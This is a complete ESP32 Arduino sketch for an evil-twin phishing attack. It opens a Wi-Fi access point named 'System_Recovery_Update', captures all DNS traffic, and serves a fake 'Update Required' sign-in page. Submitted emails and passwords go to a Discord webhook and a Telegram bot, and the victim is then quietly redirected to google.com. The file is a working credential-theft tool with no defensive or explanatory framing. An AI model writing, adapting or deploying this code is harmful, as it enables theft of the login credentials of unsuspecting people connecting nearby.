#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>

// --- Network Configuration ---
const char* WIFI_SSID = "YOUR_HOME_WIFI";
const char* WIFI_PASS = "YOUR_HOME_PASSWORD";

// --- Webhook Configuration ---
const String DISCORD_WEBHOOK = "https://discord.com/api/webhooks/ID/TOKEN";
const String TELEGRAM_TOKEN   = "YOUR_BOT_TOKEN";
const String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";

// --- Captive Portal Settings ---
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

// --- HTML Page Content ---
String loginPage = R"=====(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Authentication Required</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 50px; background-color: #f4f4f4; }
        .container { background: white; padding: 20px; display: inline-block; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { width: 95%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Update Required</h2>
        <p>Please sign in to continue</p>
        <form action="/save" method="POST">
            <input type="text" name="email" placeholder="Email or Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
)=====";

void sendToDiscord(String msg) {
    WiFiClientSecure client;
    client.setInsecure();
    HTTPClient http;
    http.begin(client, DISCORD_WEBHOOK);
    http.addHeader("Content-Type", "application/json");
    String payload = "{\"content\": \"" + msg + "\"}";
    http.POST(payload);
    http.end();
}

void sendToTelegram(String msg) {
    WiFiClientSecure client;
    client.setInsecure();
    HTTPClient http;
    String url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + "&text=" + msg;
    http.begin(client, url);
    http.GET();
    http.end();
}

void handleSave() {
    String user = server.arg("email");
    String pass = server.arg("password");
    String logMsg = "🚨 New Credentials Captured! \nUser: " + user + "\nPass: " + pass;
    
    Serial.println(logMsg);
    
    sendToDiscord(logMsg);
    sendToTelegram(logMsg);
    
    server.send(200, "text/html", "<html><body><h1>Update Successful</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 2000);</script></body></html>");
}

void setup() {
    Serial.begin(115200);

    // Connect to Internet for Webhooks
    WiFi.mode(WIFI_AP_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    
    // Setup Access Point
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("System_Recovery_Update"); // The SSID users will see

    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/", []() { server.send(200, "text/html", loginPage); });
    server.on("/save", handleSave);
    server.onNotFound([]() { server.send(200, "text/html", loginPage); });

    server.begin();
    Serial.println("System Ready.");
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}
